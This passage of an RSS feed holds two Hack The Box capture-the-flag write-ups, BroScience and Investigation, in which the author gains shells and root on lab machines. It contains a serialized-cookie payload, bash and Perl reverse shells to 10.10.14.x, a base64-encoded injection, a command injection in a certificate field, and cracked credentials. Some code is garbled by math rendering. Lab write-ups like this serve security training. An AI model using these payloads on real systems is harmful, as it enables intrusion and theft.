+<p><img src="/_resources/c697cc2ad76445d2af265dc0595aac5b.png" /></p>
+<p>We can leak the contents of the other files in the includes directory too:<br />
+<img src="/_resources/26f5cc00be1540a48ef17687e4a4dcac.png" /><br />
+The db_connect.php file gives us some credentials and a possible password:<br />
+<img src="/_resources/573668113ace444caec84d77ffab6d65.png" /></p>
+<p>RangeOfMotion%777</p>
+<p>Those credentials don't work through ssh.</p>
+<p>We examine the source code of the register.php file and see that the activation code is encoded using the utils.php file in the /includes directory:</p>
+<p><img src="/_resources/b0e581770fcd4f6db85f96413c9806be.png" /></p>
+<p>The activation code uses the random string generated by the characters in addition to the server time.</p>
+<p>We can make a user account creation request using curl, and then get the post body response back using the -i flag.</p>
+<p>The request looks like this:</p>
+<p>curl -X POST -d 'username=banana&amp;email=email%40email.com&amp;password=password&amp;password-confirm=password' <a title="https://broscience.htb/register.php" href="https://broscience.htb/register.php">https://broscience.htb/register.php</a> -k -i</p>
+<p><img src="/_resources/5825ec5adfc6430bb58d6560304fa84b.png" /></p>
+<p>We use the following site to convert the time on the server and then run the php code locally to generate the activation code.</p>
+<p><a title="https://www.epochconverter.com/" href="https://www.epochconverter.com/">https://www.epochconverter.com/</a></p>
+<p><img src="/_resources/29744083b8634534ba145da22a2962a5.png" /></p>
+<p>Then we insert the timestamp into the php code, and run it using<br />
+php -f activation.php<br />
+<img src="/_resources/dfd3efe3f5c24701844ba5fac6783a05.png" /><br />
+<img src="/_resources/0427adf2f19b40039c3f3fee5a4fc868.png" /><br />
+We can use curl the activate the account by visiting the link from the register.php file:<br />
+<img src="/_resources/5fd4617a1dc04f81b382a9d5c9610703.png" /></p>
+<p>curl -k -X POST -b 'PHPSESSID=k3k3noofq1asp18u5atu24vqgp' <a title="https://broscience.htb/activate.php?code=Recd2yo9dM8tcdm0lyzheJERDa9AIKrm" href="https://broscience.htb/activate.php?code=Recd2yo9dM8tcdm0lyzheJERDa9AIKrm">https://broscience.htb/activate.php?code=Recd2yo9dM8tcdm0lyzheJERDa9AIKrm</a> -i</p>
+<p>We activated the account:<br />
+<img src="/_resources/984a0bc849af4ee283b5f79eda2258f4.png" /></p>
+<p>Once we login we are given a new cookie. The new cookie is generated from the utils.php page and is serialized. There is a function that can be exploited because it writes a tmp file and invokes it from the server to create the user-pref cookie.<br />
+<a title="https://infosecwriteups.com/bro-science-htb-medium-ac5ee09cbdda?source=---------1-----------------------" href="https://infosecwriteups.com/bro-science-htb-medium-ac5ee09cbdda?source=---------1-----------------------">https://infosecwriteups.com/bro-science-htb-medium-ac5ee09cbdda?source=---------1-----------------------</a></p>
+<p>We can copy the php code and modify it to invoke a reverse shell script from our machine and attempt to get a shell:</p>
+<p><img src="/_resources/69ac011cb4cf443cb3ddd316b98c037e.png" /></p>
+<p>We create a new cookie for ourself. We need to open our webserver on port 9090 and create our reverse.php shell file:<br />
+<img src="/_resources/d461bef539d94bf9ac09ac867b821e94.png" /></p>
+<p>TzoxNToiQXZhdGFySW50ZXJmYWNlIjoyOntzOjM6InRtcCI7czozNToiaHR0cDovLzEwLjEwLjE0LjMzOjkwOTAvcmV2ZXJzZS5waHAiO3M6NzoiaW1nUGF0aCI7czoxMzoiLi9yZXZlcnNlLnBocCI7fQ==</p>
+<p>We load the string into the cookie under user-prefs, reload the page, and then get a shell upload:<br />
+<img src="/_resources/4f2d1d321b5a4502a4fd3907f7d9119d.png" /><br />
+We navigate to our reverse.php page and get a shell:</p>
+<p><img src="/_resources/4a5663bd7dcd49ddbf2c5a3cc953bc9e.png" /></p>
+<p>The db credentials we found earlier are postgresql credentials and the server is running on port 5432<br />
+<span><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><msub><mi>b</mi><mi>h</mi></msub><mi>o</mi><mi>s</mi><mi>t</mi><mo>=</mo><mi mathvariant="normal">"</mi><mi>l</mi><mi>o</mi><mi>c</mi><mi>a</mi><mi>l</mi><mi>h</mi><mi>o</mi><mi>s</mi><mi>t</mi><mi mathvariant="normal">"</mi><mo separator="true">;</mo></mrow><annotation encoding="application/x-tex">db_host = "localhost";
+</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em"></span><span class="mord mathnormal">d</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em"><span></span></span></span></span></span></span><span class="mord mathnormal">os</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2777777777777778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em"></span><span class="mord">"</span><span class="mord mathnormal" style="margin-right:0.01968em">l</span><span class="mord mathnormal">oc</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.01968em">l</span><span class="mord mathnormal">h</span><span class="mord mathnormal">os</span><span class="mord mathnormal">t</span><span class="mord">"</span><span class="mpunct">;</span></span></span></span></span>db_port = "5432";<br />
+<span><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><msub><mi>b</mi><mi>n</mi></msub><mi>a</mi><mi>m</mi><mi>e</mi><mo>=</mo><mi mathvariant="normal">"</mi><mi>b</mi><mi>r</mi><mi>o</mi><mi>s</mi><mi>c</mi><mi>i</mi><mi>e</mi><mi>n</mi><mi>c</mi><mi>e</mi><mi mathvariant="normal">"</mi><mo separator="true">;</mo></mrow><annotation encoding="application/x-tex">db_name = "broscience";
+</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em"></span><span class="mord mathnormal">d</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em"><span></span></span></span></span></span></span><span class="mord mathnormal">am</span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2777777777777778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em"></span><span class="mord">"</span><span class="mord mathnormal">b</span><span class="mord mathnormal">rosc</span><span class="mord mathnormal">i</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mord mathnormal">ce</span><span class="mord">"</span><span class="mpunct">;</span></span></span></span></span>db_user = "dbuser";<br />
+<span><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><msub><mi>b</mi><mi>p</mi></msub><mi>a</mi><mi>s</mi><mi>s</mi><mo>=</mo><mi mathvariant="normal">"</mi><mi>R</mi><mi>a</mi><mi>n</mi><mi>g</mi><mi>e</mi><mi>O</mi><mi>f</mi><mi>M</mi><mi>o</mi><mi>t</mi><mi>i</mi><mi>o</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">db_pass = "RangeOfMotion%777";
+</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.980548em;vertical-align:-0.286108em"></span><span class="mord mathnormal">d</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em"><span></span></span></span></span></span></span><span class="mord mathnormal">a</span><span class="mord mathnormal">ss</span><span class="mspace" style="margin-right:0.2777777777777778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em"></span><span class="mord">"</span><span class="mord mathnormal" style="margin-right:0.00773em">R</span><span class="mord mathnormal">an</span><span class="mord mathnormal" style="margin-right:0.03588em">g</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.02778em">O</span><span class="mord mathnormal" style="margin-right:0.10764em">f</span><span class="mord mathnormal" style="margin-right:0.10903em">M</span><span class="mord mathnormal">o</span><span class="mord mathnormal">t</span><span class="mord mathnormal">i</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span></span></span></span></span>db_salt = "NaCl";</p>
+<p>We attempt to login:<br />
+psql -h localhost -p 5432 -U dbuser -d broscience</p>
+<p><img src="/_resources/78656d80225a4596b5b18fb2a801b329.png" /></p>
+<p>we use \dt; and see the tables:<br />
+<img src="/_resources/7b116000c3cb4fa2aa597928108d61fa.png" /></p>
+<p>We use the select * from users; and get password hashes:</p>
+<p><img src="/_resources/7969c1966f3c40a28e99e0becbb23c52.png" /></p>
+<p>administrator 15657792073e8a843d4f91fc403454e1<br />
+bill 13edad4932da9dbb57d9cd15b66ed104<br />
+michael bd3dad50e2d578ecba87d5fa15ca5f85<br />
+john a7eed23a7be6fe0d765197b1027453fe<br />
+dmytro 5d15340bded5b9395d5d14b9c21bc82b</p>
+<p>We know the db uses the salt NaCl so we can try using hashcat to crack them:<br />
+we use the formatting hash:salt<br />
+hashcat -m 20 hashes /usr/share/wordlists/rockyou.txt</p>
+<p>Three hashes cracked:<br />
+<img src="/_resources/2e9f4c07469d4ce4ad545e5b5e402e42.png" /></p>
+<p>bill:iluvhorsesandgym<br />
+dymtro:Aaronthehottest<br />
+michael:2applesplus2apples</p>
+<p>We ssh into bill's account and get the user.txt:<br />
+ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" bill@broscience.htb<br />
+<img src="/_resources/e1e0d2096ecd4a56861bedd5a290d7e9.png" /><br />
+1e514f8804d542b23ab45327c1dd6ee6</p>
+<p>We run pspy64 to see what processes are running with elevated permissions:<br />
+<img src="/_resources/899e438d23a34531addd7fec2a1c31b7.png" /></p>
+<p>We see that the root user is executing a script</p>
+<p><img src="/_resources/7023698ed7d3447f9b37e1e83406c2f2.png" /></p>
+<p>The root user runs a script to verify whether a certificate is close to expiring. If it is the script will print out information about the certificate.</p>
+<p>We can try generating a self signed certificate using the information below:<br />
+<a title="https://www.ibm.com/docs/en/api-connect/10.0.1.x?topic=overview-generating-self-signed-certificate-using-openssl" href="https://www.ibm.com/docs/en/api-connect/10.0.1.x?topic=overview-generating-self-signed-certificate-using-openssl">https://www.ibm.com/docs/en/api-connect/10.0.1.x?topic=overview-generating-self-signed-certificate-using-openssl</a></p>
+<p>openssl req -x509 -sha256 -nodes -newkey rsa:4096 -days 5 -keyout broscience.key -out broscience.crt</p>
+<p><img src="/_resources/200e43fd27d844daa0dc2017ae934d1a.png" /></p>
+<p>The $(chmod u+s /bin/bash) is used to modify the permissions on /bin/bash and make it suid.</p>
+<p>It worked, and now we are root:<br />
+<img src="/_resources/0d480e00c47b428f9836b5788db8dbf8.png" /><br />
+804d73ab424ed0c79c2baee2df93f641</p>
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[HTB Ivestigation]]></title>
+            <guid>59e466e195c14c73a0106d55bf30e8a2</guid>
+            <pubDate>Mon, 06 Feb 2023 16:40:12 GMT</pubDate>
+            <content:encoded><![CDATA[<p>We do an initial nmap scan<br />
+nmap -sC -sV -oA nmap/initial 10.10.11.197<br />
+<img src="/_resources/cfac6cb2fb064a298bc70c6cc90c71bd.png" /><br />
+This tells us we need to make an entry into our /etc/hosts file for:<br />
+<a title="http://eforenzics.htb/" href="http://eforenzics.htb/">http://eforenzics.htb/</a></p>
+<p>We repeat the nmap scan and the host resolves:<br />
+nmap -sC -sV -oA nmap/initial 10.10.11.197<br />
+<img src="/_resources/c2bbfaf22d2b4a97ac7ca6f998f1799f.png" /></p>
+<p>A full port scan tells us there are no other open TCP ports:<br />
+nmap -p- nmap/full 10.10.11.197<br />
+<img src="/_resources/fdf5e332f16842cc91575114c0498d5a.png" /></p>
+<p>We visit the site on port 80.<br />
+There is a page to upload jpg files, and not much else:<br />
+<img src="/_resources/267df9f4956e4118afdb962de691f3fa.png" /><br />
+We run gobuster in the background nonetheless.</p>
+<p>gobuster dir -u <a title="http://eforenzics.htb/" href="http://eforenzics.htb/">http://eforenzics.htb/</a> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -b "400,404,204,301,302,307,401,403,500"</p>
+<p>The upload link is for a php file:<br />
+<img src="/_resources/f4317e88c20742f3a8e66aab4af89df9.png" /></p>
+<p>We use the magic bytes for a jpg to make a webshell:<br />
+<a title="https://danielxblack.ghost.io/bypassing-file-upload-restrictions-with-a-magic-byte-and-hex-editor/" href="https://danielxblack.ghost.io/bypassing-file-upload-restrictions-with-a-magic-byte-and-hex-editor/">https://danielxblack.ghost.io/bypassing-file-upload-restrictions-with-a-magic-byte-and-hex-editor/</a></p>
+<p><img src="/_resources/34dd97ee71764f5ba08efa539b246fb3.png" /></p>
+<p>That fails, but it gives us feedback that we can upload a png file. We find a shell generator that someone made on github:<br />
+<a title="https://github.com/jimmygiv/simpleshell" href="https://github.com/jimmygiv/simpleshell">https://github.com/jimmygiv/simpleshell</a></p>
+<p>We use the png setting and upload a webshell:<br />
+<img src="/_resources/80bca534c1734b9685ee6b5b03612582.png" /></p>
+<p>We follow the link and it tells us the image was uploaded, that it will only be available for five minutes. We do not have directory information about where the file is stores, so we cannot call it:<br />
+<img src="/_resources/ae56b5a5563b4272885cd099fb8a6a17.png" /></p>
+<p>We have the version number of ExifTool which apparently has a path traversal vulnerability<br />
+<a title="https://gist.github.com/ert-plus/1414276e4cb5d56dd431c2f0429e4429" href="https://gist.github.com/ert-plus/1414276e4cb5d56dd431c2f0429e4429">https://gist.github.com/ert-plus/1414276e4cb5d56dd431c2f0429e4429</a></p>
+<p>We test in the same way we see in the post:<br />
+<img src="/_resources/62599f597c43466fbc2ad90d87af2f39.png" /><br />
+It works.</p>
+<p>We encode a reverse shell bash line:<br />
+echo "/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.57/4444 0&gt;&amp;1" | base64<br />
+<img src="/_resources/7d0364eae8304c66ae8e8cd65463f906.png" /></p>
+<p>We use the following payload in burpsuite and gain a shell:<br />
+echo 'L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjU3LzQ0NDQgMD4mMQo=' | base64 -d| bash|</p>
+<p><img src="/_resources/9ec2e26f0140485d98b123c3c5efe2cf.png" /></p>
+<p><img src="/_resources/d8704331bfce4467969c4b8a4dceecab.png" /></p>
+<p>We find a hidden file in /usr/local/investigation:<br />
+<img src="/_resources/459b24b2a6a64f838f72dd3675947d1f.png" /></p>
+<p>It is an Ms outlook message:<br />
+<img src="/_resources/9e63414a25f34608bce7d935da7046b1.png" /></p>
+<p>We transfer the file to our machine using netcat, then use this online converter:<br />
+<a title="https://products.aspose.app/email/viewer/msg" href="https://products.aspose.app/email/viewer/msg">https://products.aspose.app/email/viewer/msg</a><br />
+<img src="/_resources/ea34c73f883c44b88f6fa834dd1f265c.png" /><br />
+This site allows for us to use the email we downloaded to get the attachment file in the email:<br />
+<a title="https://www.encryptomatic.com/viewer/" href="https://www.encryptomatic.com/viewer/">https://www.encryptomatic.com/viewer/</a></p>
+<p>We use the following python script to extract the evtx file into an xml document:<br />
+<a title="https://github.com/williballenthin/python-evtx/blob/master/scripts/evtx_dump.py" href="https://github.com/williballenthin/python-evtx/blob/master/scripts/evtx_dump.py">https://github.com/williballenthin/python-evtx/blob/master/scripts/evtx_dump.py</a></p>
+<p>Rather than sift through this long document, we use grep to search for username:<br />
+python2 evtx_dump.py security.evtx | grep UserName</p>
+<p>We find some credentials<br />
+<img src="/_resources/66db318372b54b9eafdb3e9fa317dbf5.png" /></p>
+<p>Def@ultf0r3nz!csPa$$<br />
+We can try to ssh into the machine with these credentials:</p>
+<p><img src="/_resources/ff05bf70043e470bb1112504eef25216.png" /></p>
+<p>ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" smorton@10.10.11.197<br />
+<img src="/_resources/0f9b95e33a1646acb53fc42c74ed0c91.png" /></p>
+<p>smorton has sudo rights to use /usr/bin/binary<br />
+<img src="/_resources/3c3d85cb1a894d25985c267d70eada51.png" /></p>
+<p>Since we don't know what that binary does, we transfer it to our machine and try to look at it.<br />
+We cannot look at the binary locally, but can use <a title="https://dogbolt.org/" href="https://dogbolt.org/">https://dogbolt.org/</a> to explore the code:<br />
+<img src="/_resources/10cac9c95b9040cc8a96c0dce331c8b9.png" /></p>
+<p>We can see that the binary executes a curl command. so maybe if we feed it a binary or file with our IP we can call a reverse shell with root privileges:<br />
+The argument name is given here:<br />
+<img src="/_resources/869ffc74467f4f20afd4f2826931631f.png" /><br />
+lDnxUysaQn<br />
+The same filename we saw in the user's home dir:<br />
+<img src="/_resources/c710ce4132a04992b98ad9ba109e1b39.png" /><br />
+The code also tells us what language the file should be written in:<br />
+<img src="/_resources/f0cadb33ec0446d99000bd4cf99b88a6.png" /></p>
+<p>We can try generating a perl revese shell.</p>
+<p>use Socket;<span><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo>=</mo><mi mathvariant="normal">"</mi><mn>10.10.14.57</mn><mi mathvariant="normal">"</mi><mo separator="true">;</mo></mrow><annotation encoding="application/x-tex">i="10.10.14.57";</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2777777777777778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em"></span><span class="mord">"10.10.14.57"</span><span class="mpunct">;</span></span></span></span></span>p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(<span><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo separator="true">,</mo><mi>i</mi><mi>n</mi><mi>e</mi><msub><mi>t</mi><mi>a</mi></msub><mi>t</mi><mi>o</mi><mi>n</mi><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">p,inet_aton(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em"></span><span class="mord mathnormal">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em"></span><span class="mord mathnormal">in</span><span class="mord mathnormal">e</span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em"><span></span></span></span></span></span></span><span class="mord mathnormal">t</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mopen">(</span></span></span></span></span>i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/bash -i");};</p>
+<p>We do no have write permissions on the file though. We rename the original to old, and the write our file with the filename:<br />
+<img src="/_resources/b4936eb01bdf4b8a8dc004ab6dcc53c5.png" /></p>
+<p>We test it by opening a nc listener and seeing what the binary will do:<br />
+<img src="/_resources/bd8869a5448644129bb6497943bac232.png" /><br />
+<img src="/_resources/d9106c576dbe4f788c4e26d85567282d.png" /></p>
+<p>We host the reverse shell pl script on our kali machine, open the simple server.<br />
+<img src="/_resources/5474c526ffec46aaad92d6a50f3bb97a.png" /></p>
+<p>We run sudo binary 10.10.14.57/shell.pl lDnxUysaQn on the remote machine<br />
+<img src="/_resources/4379b13a5da4411598af66a2d6ba839f.png" /></p>
+<p>Then we get a our shell:<br />
+<img src="/_resources/a1a001c33277401bb1b10764b1248450.png" /></p>
 ]]></content:encoded>
         </item>
     </channel>
